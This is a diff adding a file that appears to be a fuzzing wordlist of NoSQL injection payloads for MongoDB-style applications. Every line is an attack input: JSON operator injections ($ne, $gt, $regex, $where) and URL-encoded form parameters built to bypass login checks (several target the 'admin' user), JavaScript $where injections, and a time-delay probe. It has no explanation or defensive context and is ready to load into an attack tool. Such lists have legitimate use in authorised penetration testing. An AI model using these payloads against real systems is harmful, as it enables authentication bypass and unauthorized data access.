@@ -1,0 +1,53 @@
+' || '1'=='1
+' || 1==1
+{"$gt": ""}
+{"$gt": -1}
+{"$gt": 0}
+{"$gt": null}
+{"$gte": ""}
+{"$gte": 0}
+{"$lt": "~"}
+{"$lte": "~"}
+{"$ne": ""}
+{"$ne": -1}
+{"$ne": 0}
+{"$ne": 1}
+{"$ne": null}
+{"$nin": []}
+{"$regex": ".*"}
+{"$regex": "^"}
+{"$regex": "^a"}
+{"$where": "1==1"}
+{"$where": "return true"}
+{"$where": "sleep(5000)"}
+{"$where": "this.password.match(/.*/)"}
+{"$where": "function(){return true}"}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": {"$regex": "^admin"}, "password": {"$gt": ""}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": "admin", "password": {"$ne": ""}}
+{"username": "admin", "password": {"$regex": ".*"}}
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+'; return '' == '
+'; return true; var foo='
+a][$ne]=1&b
+a[$gt]=&b[$gt]=
+a[$ne]=1
+a[$regex]=.*
+password[$gt]=&username=admin
+password[$ne]=&username=admin
+password[$ne]=impossible&username=admin
+password[$regex]=.*&username=admin
+username[$gt]=&password[$gt]=
+username[$ne]=&password[$ne]=
+username[$regex]=.*&password[$regex]=.*
+username=admin&password[$gt]=
+username=admin&password[$ne]=
+username=admin&password[$regex]=.*
+{"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$gt": ""}}
+{"_id": {"$gt": ""}}
